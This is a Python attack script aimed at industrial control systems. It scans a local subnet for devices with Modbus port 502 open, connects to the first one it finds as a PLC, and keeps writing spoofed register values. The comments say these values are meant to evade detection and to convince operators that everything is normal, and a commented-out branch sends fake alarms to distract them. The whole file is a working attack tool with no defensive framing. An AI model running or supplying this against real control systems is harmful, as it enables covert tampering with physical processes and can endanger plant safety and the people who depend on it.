from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
import time

# Function to scan the network for the PLC
def find_plc_ip(network_range="192.168.1.0/24", port=502):
    print("[*] Scanning network to find PLC...")
    ans, unans = sr(IP(dst=network_range)/TCP(dport=port, flags="S"), timeout=2, verbose=0)

    for sent, received in ans:
        if received.haslayer(TCP) and received.getlayer(TCP).flags == 18:  # SYN-ACK response
            print(f"[+] Found potential PLC at IP: {received.src}")
            return received.src
    print("[-] No PLC found.")
    return None

# Function to spoof reporting messages
def spoof_reporting_message(plc_ip):
    print(f"[*] Spoofing reporting messages to PLC ({plc_ip})...")

    # Connect to the PLC's Modbus/TCP Server
    client = ModbusTcpClient(plc_ip, port=502)
    if not client.connect():
        print("[-] Could not connect to the PLC!")
        return

    # Define spoofed telemetry values (e.g., normal readings to evade detection)
    # Assuming register 40001 holds critical process data
    normal_value = 100  # Example fake normal value
    alarm_value = 9999  # Example misleading alert value

    while True:
        # Send manipulated value pretending that everything is okay
        if client.write_register(1, normal_value):
            print("[+] Sent normal spoofed value.")
        
        # Uncomment below to alternatively send misleading alert messages
        # if client.write_register(1, alarm_value):
        #     print("[!] Sent fake alert value to distract operators.")

        time.sleep(5)  # Wait before sending the next spoofed packet

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        spoof_reporting_message(plc_ip)
    else:
        print("[-] No PLC found. Exiting.")